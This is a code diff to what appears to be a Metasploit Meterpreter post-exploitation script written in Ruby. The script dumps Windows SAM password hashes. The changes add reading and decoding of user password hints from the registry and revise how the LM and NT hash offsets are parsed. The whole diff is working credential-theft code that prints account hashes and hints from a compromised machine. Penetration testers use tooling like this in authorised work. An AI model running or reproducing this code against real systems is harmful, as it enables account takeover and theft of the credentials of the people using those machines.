@@ -101,6 +101,14 @@ def capture_user_keys
 		users[usr.to_i(16)] ||={}
 		users[usr.to_i(16)][:F] = uk.query_value("F").data
 		users[usr.to_i(16)][:V] = uk.query_value("V").data
+		
+		#Attempt to get Hints (from Win7/Win8 Location)
+		begin
+			users[usr.to_i(16)][:UserPasswordHint] = decode_windows_hint(uk.query_value("UserPasswordHint").data.unpack("H*")[0])
+		rescue ::Rex::Post::Meterpreter::RequestError
+			users[usr.to_i(16)][:UserPasswordHint] = nil
+		end
+		
 		uk.close
 	end
 	ok.close
@@ -112,6 +120,17 @@ def capture_user_keys
 		rid = r.type
 		users[rid] ||= {}
 		users[rid][:Name] = usr
+		
+		#Attempt to get Hints (from WinXP Location) only if it's not set yet
+		if users[rid][:UserPasswordHint].nil?	
+			begin
+				uk_hint = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
+				users[rid][:UserPasswordHint] = uk_hint.query_value("").data
+			rescue ::Rex::Post::Meterpreter::RequestError
+				users[rid][:UserPasswordHint] = nil
+			end
+		end
+		
 		uk.close
 	end
 	ok.close
@@ -122,33 +141,33 @@ def decrypt_user_keys(hbootkey, users)
 	users.each_key do |rid|
 		user = users[rid]
 
-		hashlm_off = nil
-		hashnt_off = nil
-		hashlm_enc = nil
-		hashnt_enc = nil
+		hashlm_enc = ""
+		hashnt_enc = ""
 
 		hoff = user[:V][0x9c, 4].unpack("V")[0] + 0xcc
 
-		# Lanman and NTLM hash available
-		if(hoff + 0x28 < user[:V].length)
-			hashlm_off = hoff +  4
-			hashnt_off = hoff + 24
-			hashlm_enc = user[:V][hashlm_off, 16]
-			hashnt_enc = user[:V][hashnt_off, 16]
-		# No stored lanman hash
-		elsif (hoff + 0x14 < user[:V].length)
-			hashnt_off = hoff + 8
-			hashnt_enc = user[:V][hashnt_off, 16]
-			hashlm_enc = ""
-		# No stored hashes at all
-		else
-			hashnt_enc = hashlm_enc = ""
-		end
+		#Check if hashes exist (if 20, then we've got a hash)
+		lm_exists = user[:V][0x9c+4,4].unpack("V")[0] == 20 ? true : false
+		nt_exists = user[:V][0x9c+16,4].unpack("V")[0] == 20 ? true : false
+
+		#If we have a hashes, then parse them (Note: NT is dependant on LM)
+		hashlm_enc = user[:V][hoff + 4, 16] if lm_exists
+		hashnt_enc = user[:V][(hoff + (lm_exists ? 24 : 8)), 16] if nt_exists
+
 		user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass)
 		user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass)
 	end
 
 	users
+end
+
+def decode_windows_hint(e_string)
+	d_string = ""
+	e_string.scan(/..../).each do |chunk|
+		bytes = chunk.scan(/../)
+		d_string += (bytes[1] + bytes[0]).to_s.hex.chr
+	end
+	d_string
 end
 
 def convert_des_56_to_64(kstr)
@@ -235,6 +254,19 @@ if client.platform =~ /win32|win64/
 		print_status("Decrypting user keys...")
 		users    = decrypt_user_keys(hbootkey, users)
 
+		print_status("Dumping password hints...")
+		print_line()
+		hint_count = 0
+		users.keys.sort{|a,b| a<=>b}.each do |rid|
+			#If we have a hint then print it
+			if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
+				print_line "#{users[rid][:Name]}:\"#{users[rid][:UserPasswordHint]}\""
+				hint_count += 1
+			end	
+		end
+		print_line("No users with password hints on this system") if hint_count == 0 
+		print_line()
+
 		print_status("Dumping password hashes...")
 		print_line()
 		print_line()
@@ -248,7 +280,9 @@ if client.platform =~ /win32|win64/
 				:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
 				:type  => "smb_hash"
 			)
+			
 			print_line hashstring
+			
 		end
 		print_line()
 		print_line()
